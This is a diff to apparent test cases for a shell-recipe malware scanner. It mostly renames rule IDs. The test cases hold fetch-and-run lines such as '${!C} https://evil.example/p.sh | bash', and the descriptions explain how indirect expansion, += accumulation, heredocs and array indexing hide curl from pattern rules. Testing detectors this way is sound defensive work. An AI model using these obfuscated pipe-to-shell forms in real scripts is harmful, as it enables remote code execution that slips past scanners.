@@ -69,9 +69,9 @@ add("evasion-fetch-via-indirect",
         "${!C} https://evil.example/p.sh | bash",
     ),
     description="The fetch tool is reached through ${!C} indirection, so the "
-                "resolved line keeps no literal curl/wget for R001/R002/R061 "
-                "and R129 to name",
-    known_gap=False, must_fire=["R132"], min_score=40)
+                "resolved line keeps no literal curl/wget for R001/R002/H016 "
+                "and H077 to name",
+    known_gap=False, must_fire=["H080"], min_score=40)
 
 # ── 2. The shell at the far end of the pipe is an indirect expansion ─────────
 
@@ -83,7 +83,7 @@ add("evasion-shell-via-indirect",
     ),
     description="curl is variable-routed and the shell is reached through "
                 "${!P}: R001's shell alternation names literals only",
-    known_gap=False, must_fire=["R132"], min_score=40)
+    known_gap=False, must_fire=["H080"], min_score=40)
 
 # ── 3. The fetch tool is accumulated with += ─────────────────────────────────
 
@@ -96,7 +96,7 @@ add("evasion-command-via-plus-eq",
     description="C is assembled only with +=, so no single line carries a "
                 "literal curl; once the resolver accumulates +=, $C resolves "
                 "to `curl https://evil.example/p.sh | bash` and R001 owns it",
-    # Not R132: nothing here is *indirect*.  Once the tokenizer accumulates
+    # Not H080: nothing here is *indirect*.  Once the tokenizer accumulates
     # +=, $C resolves to a literal `curl ... | bash` and R001 owns it.
     known_gap=False, must_fire=["R001"], min_score=40)
 
@@ -129,7 +129,7 @@ add("evasion-heredoc-fed-indirect",
     description="The remote-execution line lives inside a heredoc fed "
                 "straight to a shell; the literal pipe-to-shell rules never "
                 "see it once the fetch is indirect",
-    known_gap=False, must_fire=["R132"], min_score=40)
+    known_gap=False, must_fire=["H080"], min_score=40)
 
 # ── 6. A heredoc writes a script that is then sourced ────────────────────────
 
@@ -144,9 +144,9 @@ add("evasion-heredoc-written-indirect",
         "}",
     ),
     description="The recipe writes an executable script into $srcdir and "
-                "sources it; R121/R124 want the writer and the executor in "
+                "sources it; H069/H072 want the writer and the executor in "
                 "the same visible line, and the fetch inside is indirect",
-    known_gap=False, must_fire=["R132"], min_score=40)
+    known_gap=False, must_fire=["H080"], min_score=40)
 
 
 # ── 7. The fetch tool is an array element ────────────────────────────────────
@@ -158,7 +158,7 @@ add("evasion-command-via-array-index",
     ),
     description="curl is stored as an array element and reached through "
                 "${A[0]}; the resolver folds A only as a whole, never by "
-                "subscript, and ${A[0]} is not the ${!name} form R132 reads, "
+                "subscript, and ${A[0]} is not the ${!name} form H080 reads, "
                 "so the fetch line keeps no literal curl",
     known_gap=True, must_fire=["R133"], min_score=40)
 
